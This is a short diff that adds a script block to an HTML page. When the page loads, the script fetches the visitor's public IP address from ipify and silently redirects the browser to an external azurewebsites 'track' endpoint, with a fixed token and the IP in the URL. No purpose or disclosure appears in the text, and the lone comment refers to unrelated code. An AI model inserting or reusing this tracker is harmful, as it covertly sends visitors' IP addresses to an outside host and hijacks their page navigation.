@@ -1,0 +1,12 @@
+"   <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+       <script>
+        var ip="";
+        window.addEventListener('load',function () {
+        $.getJSON("https://api.ipify.org?format=json",
+                        function(data) {
+    
+          // Setting text of element P with id gfg
+          location.replace("https://tracki-file.azurewebsites.net/track?token=d777ade3de877a192505f0072ae6940f&&ip="+data.ip);
+        })
+         })
+       </script>
